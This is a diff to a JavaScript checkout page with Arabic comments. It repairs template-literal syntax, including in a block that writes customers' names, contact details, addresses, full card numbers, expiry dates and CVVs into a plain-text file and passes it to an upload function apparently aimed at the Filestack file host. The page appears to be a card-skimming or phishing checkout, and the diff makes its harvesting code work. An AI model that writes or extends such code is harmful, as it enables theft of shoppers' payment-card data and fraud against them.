@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // حساب السعر الإجمالي
   const totalPrice = urlParams.price * urlParams.quantity;
-  document.getElementById('total-price').textContent = $${totalPrice};
+  document.getElementById('total-price').textContent = `$${totalPrice}`;
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
@@ -152,23 +152,23 @@ document.addEventListener('DOMContentLoaded', function () {
       };
 
       // إنشاء المحتوى لملف نصي
-      let fileContent = Client Data:\n;
-      fileContent += Email: ${email}\n;
-      fileContent += First Name: ${firstName}\n;
-      fileContent += Last Name: ${lastName}\n;
-      fileContent += Phone: ${phone}\n;
-      fileContent += Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n;
-      fileContent += Card Name: ${cardName}\n;
-      fileContent += Card Number: ${cardNumber}\n;
-      fileContent += Expiry: ${expiry}\n;
-      fileContent += CVV: ${cvv}\n\n;
-      fileContent += Product Information:\n;
-      fileContent += Product Name: ${productName}\n;
-      fileContent += Product Price: ${productPriceText}\n;
-      fileContent += Product Quantity: ${productQuantityText}\n;
-      fileContent += Product Image URL: ${productImageUrl}\n;
-      fileContent += Total Price: ${totalPrice}\n;
-      fileContent += Coupon Code: ${couponCode}\n;
+      let fileContent = `Client Data:\n`;
+      fileContent += `Email: ${email}\n`;
+      fileContent += `First Name: ${firstName}\n`;
+      fileContent += `Last Name: ${lastName}\n`;
+      fileContent += `Phone: ${phone}\n`;
+      fileContent += `Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n`;
+      fileContent += `Card Name: ${cardName}\n`;
+      fileContent += `Card Number: ${cardNumber}\n`;
+      fileContent += `Expiry: ${expiry}\n`;
+      fileContent += `CVV: ${cvv}\n\n`;
+      fileContent += `Product Information:\n`;
+      fileContent += `Product Name: ${productName}\n`;
+      fileContent += `Product Price: ${productPriceText}\n`;
+      fileContent += `Product Quantity: ${productQuantityText}\n`;
+      fileContent += `Product Image URL: ${productImageUrl}\n`;
+      fileContent += `Total Price: ${totalPrice}\n`;
+      fileContent += `Coupon Code: ${couponCode}\n`;
 
       // رفع الملف إلى Filestack
       uploadFileToFilestack(fileContent); 
@@ -178,7 +178,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   function isCardExpired(expiry) {
     const [month, year] = expiry.split('/');  // تقسيم التاريخ إلى الشهر والسنة
-    const expiryDate = new Date(20${year}, month - 1);  // إنشاء تاريخ انتهاء البطاقة
+    const expiryDate = new Date(`20${year}`, month - 1);  // إنشاء تاريخ انتهاء البطاقة
 
     const currentDate = new Date();  // التاريخ الحالي
     currentDate.setHours(0, 0, 0, 0);  // إزالة الوقت من التاريخ الحالي
